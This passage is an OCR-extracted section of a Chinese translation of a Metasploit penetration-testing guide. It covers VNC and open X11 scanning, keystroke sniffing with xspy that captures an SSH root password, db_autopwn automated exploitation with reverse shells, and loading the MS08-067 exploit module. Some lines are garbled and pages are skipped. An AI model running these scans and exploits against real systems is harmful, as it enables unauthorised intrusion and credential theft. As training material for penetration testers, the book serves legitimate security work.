esttopname
NCserver de
2bits
Least signi
ue colour
sing default
图4-18使用vncviewer连接到未设置口令的VNC服务器
53
---
## Page 81
Metasploit渗透测试指南
试想一下，如果你觉得一次VNC扫描纯粹是浪费时间，那么你永远也不会发现启用了开
放VNC服务的系统。在一次有上千个目标主机的大型渗透测试工作中，本书的一位作者注意
到在这些系统中有一台开放的VNC服务器。
当作者正在记录自已的发现时，他注意到有人正在操作这台主机。当时正是午夜时分，不
太可能是合法用户正在使用机器。他于是假装成另一个未经授权的入侵者（这么做不一定是总
是个好主意)，通过记事本程序与正在操作主机的入侵者进行了一次谈话。这位入侵者并没有戒
心，相信了作者的话，并告诉作者他正在一大堆系统中扫描VNC服务器。下面是这次谈话的
片段：
作者：你在美国？还是其他国家？我在丹麦有一些朋友。
攻击者：其实我是挪威的，呵呵，我在丹麦有几个亲戚。
作者：你喜欢泡论坛吗？我以前喜欢泡的几个论坛都不在了。
攻击者：我大部分时候在一些编程论坛里混，其他的不太感兴趣。你搞黑客很长时间了吗？
顺便问一句，你多大了？我22岁。
作者：我做这个有大概一年时间吧，纯属个人兴趣。我还在上学，现在16岁。
攻击者：我没上过学，我做这个也只是想找找乐子，想看看我能做到什么程度，考验一下
自己的技能。我写了一个“VNC搜索器”，用这东西发现了很多VNC服务器，不过只有这一台
最有意思。
作者：哇，你太厉害了，你用什么写的？我能下载吗？你有办法帮我共享一下吗？
攻击者：我是用一种叫做PureBasic的语言写的，但还没有打算把它公布，只是自己在用。
不过我也许可以考虑给你共享一份。我把代码上传到一个地方然后你自己下载编译。不过你得
到一些软件下载网站找到PureBasic的编译器：P。
作者：太酷了。你可以把它传到irc 的 pastebin 网站上，那里可以匿名上传文件。我之前
没有用过PureBasic，只用过Python和Perl。
攻击者：让我看看，我找一下你说的pastebin网站把它传上去，等我几分钟，我马上回来。
随后这位攻击者给了作者一个pastebin网页的链接，里面是他写的VNC扫描器的完整源
代码。
4.4.3扫描开放的×11服务器
Metasploit的内置open_xll扫描器与vnc_auth扫描器类似，它同样能够在一堆主机中发现
X11服务器，该服务器允许用户无需身份认证即可连接。尽管X11服务器在新的操作系统上已
不再广泛使用了，但许多古老的主机仍在使用着旧版的、未打补丁的、已被历史遗忘的操作系
54
---
## Page 82
第4章漏洞扫描
统。正如你在前面的两个例子中看到的，老旧的系统往往是网络上最脆弱的地方。
运行open_xll扫描器的过程，和运行大多数其他辅助模块类似，你需要设置RHOSTS参
数，也可以选择性地修改THREAD值。扫描开始后会显示一段会话过程。请注意，扫描器在
IP地址192.168.1.23处找到了-个开放的X服务器。这是一个严重的漏洞，因为它允许攻击者
可以对系统进行未授权的访问：X系统用来处理包括鼠标和键盘支持在内的图形用户界面。
msf >use auxiliary/scanner/x11/open_x11
msfauxiliary(open_x11)>showoptions
Module options:
Name
Current Setting Required Description
RHOSTS
yes
The target address range or CIDR identifier
RPORT
6000
yes
The target port
THREADS1
yes
The number of concurrent threads
msf auxiliary(open_x11) > set RH0STS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(open_x11)>setTHREADS 50
THREADS=> 50
msf auxiliary(open_x11)>run
[*]Trying 192.168.1.1
[*] Trying 192.168.1.0
[*] Trying 192.168.1.2...
[*]Trying 192.168.1.29
[*] Trying 192.168.1.30
[*] OpenX Server @ 192.168.1.23(The XFree86Project,Inc)
[*] Trying 192.168.1.31
[*] Trying 192.168.1.32
[*]Trying192.168.1.253
[*] Trying 192.168.1.254
[*] Trying 192.168.1.255
[*] Auxiliary module execution completed
让我们看看攻击者能够利用这个漏洞做些什么。现在使用BackTrack的xspy工具来对目标
的键盘输入进行记录，如下所示：
root@bt:/#cd/pentest/sniffers/xspy/
ssh PI:EMAIL(+BackSpace)37
sup3rs3cr3tp4s5w0rd
ifconfig
exit
55
---
## Page 83
Metasploit渗透测试指南
Xspy工具能够远程嗅探到X服务器的键盘操作，并记录下某个用户使用SSH以root身份
登录另一个远程系统的过程，其中包含了登录口令。这样的漏洞可能非常罕见，但一旦发现，
它们极具价值。
4.5利用扫描结果进行自动化攻击
下面我们转入对渗透攻击的简要介绍，Metasploit的Autopwn工具能够自动选择目标，并
利用已开放端口或漏洞扫描结果，对目标进行自动化的渗透攻击。你可以利用大多数漏洞扫描
器（包括NeXpose、Nessus以及OpenVAS）的结果来执行Autopwn。
下面将展示如何使用导入的Nessus扫描结果定位一个系统并对其进行自动化渗透攻击。使
用db_connect命令创建一个新数据库，并使用db_import命令导入扫描报告。在示例中，我们
运行db_autopwn命令，这个命令包含一系列开关参数：对所有目标发起攻击（e），显示所有
匹配的模块（t)，使用反弹shell的攻击载荷（r)，根据漏洞选择攻击模块（x)，根据开放端口
选择攻击模块（p）。db_autopwn命令启动后，Metasploit开始对目标展开攻击，如果攻击成功，
会返回一个被攻击计算机的控制shell。
msf > db_connect postgres:toor@127.o.o.1/msf3
msf>db_import/root/nessus.nbe
d- x- I-- a- umdozneqpshowexploits
这个命令会显示Metasploit框架中所有可用的渗透攻击模块。在MSF终端中，你可以针对
渗透测试中发现的安全漏洞来实施相应的渗透攻击。Metasploit团队总是不断地开发出新的渗透
攻击模块，因此这个列表会越来越长。
5.1.2 msf> show auxiliary
这个命令会显示所有的辅助模块以及它们的用途。在Metasploit中，辅助模块的用途非常
广泛，它们可以是扫描器、拒绝服务攻击工具、Fuzz测试器，以及其他类型的工具。
5.1.3 msf> show options
参数（Options）是保证Metasploit框架中各个模块正确运行所需的各种设置。当你选择了
一个模块，并输入msf>showoptions后，会列出这个模块所需的各种参数。如果当前你没有选
择任何模块，那么输入这个命令会显示所有的全局参数，举例来说，你可以修改全局参数中的
LogLevel，使渗透攻击时记录系统日志更为详细。你还可以输入back命令，以返回到Metasploit
的上一个状态。
Y
msf>usewindows/smb/ms08_o67_netapi
msf exploit(ms08_067_netapi) >back
msf >
当你想要查找某个特定的渗透攻击、辅助或攻击载荷模块时，搜索（search）命令非常有
用。例如，如果你想发起一次针对SQL数据库的攻击，输入下面的命令可以搜索出与SQL有
关的模块。
msf>search mssql
58
---
## Page 86
第5章渗透攻击之旅
Auxiliary
Name
Disclosure Date Rank
Description
admin/mssql/mssql_enum
1MicrosoftSQLServer Configuration
Enumerator
admin/mssql/mssql_exec
normalMicrosoft SQL Server xp_cmdshell
Command Execution
admin/mssql/mssql_idf
normal
Microsoft SQL Server - Interesting
Data Finder
admin/mssql/mssql_sql
normal
MicrosoftSQLServerGenericQuery
scanner/mssql/mssql_login
MSSQL Login Utility
scanner/mssql/mssql_ping
normal MSSQL Ping Utility
Exploits
msf>
类似地，可以使用下面的命令寻找与MS08-067漏洞相关的模块。（MS08-067漏洞是远程
过程调用[RPC]服务中的一个弱点，臭名昭著的“飞客”蠕虫Conficker便利用这个漏洞来侵入
系统。）
msf>search mso8_067
[*]Searching loaded modules for pattern‘mso8_o67'...
Exploits
Rank
Description
windows/smb/mso8_o67_netapi great Microsoft Server Service Relative Path Stack Corruption
找到攻击模块（windows/smb/ms08_067_netapi）后，可以使用use命令加载模块，如下
所示：
msf>usewindows/smb/mso8_067_netapi
msf exploit(ms08_067_netapi) >
请注意当我们执行了usewindows/smb/ms08_067_netapi命令后，MSF终端的提示符变成
了下面的样子：
msf exploit(ms08_067_netapi)>
这表明我们已经选择了ms08_067_netapi模块，这时候在终端中输入的命令将在这个攻击
模块的环境中运行。
59
---
## Page 87
Metasploit渗透测试指南
提示：无论你当前处于哪个模块环境中，都可以使用search和use命令跳转到另一个模块中。
现在，在已选择模块的命令提示符下，可以输入showoptions显示MS08-067模块所需的
参数：
msf exploit(ms08_o67_netapi)> show options
Module options:
Name
CurrentSettingRequiredDescription
RHOST
yes
The target address
RPORT
445
yes
Setthe SMBservice port
SMBPIPE BROWSER
yes
The pipe name to use (BROWSER, SRVSVC)
Exploit target:
Id  Name
--
0Automatic Targeting
msf exploit(ms08_067_netapi)>
这种与上下文相关的参数访问方式让Metasploit的界面变得非常简洁，并且让你能够只专
注于当前实际需要的参数。
5.1.4msf>showpayloads
回想一下，在第2章中我们介绍了攻击载荷是针对特定平台的一段攻击代码，它将通过网
络传送到攻击目标进行执行。和showoptions命令一样，当你在当前模块的命令提示符下输入
showpayloads命令时，Metasploit只会将与当前模块兼容的攻击载荷显示出来。在针对基于
Windows操作系统的攻击中，简单的攻击载荷可能只会返回目标主机的一个命令行界面，复杂
的能够返回一个完整的图形操作界面。输入下面的命令可以查看到所有活动状态的攻击载荷：
msf>show payloads
上面的命令将显示Metasploit中所有的可用攻击载荷，然而如果你正在进行一次实际的渗
透攻击，你可能只会看到适用于本次渗透攻击的攻击载荷列表。举例来说，在msfexploit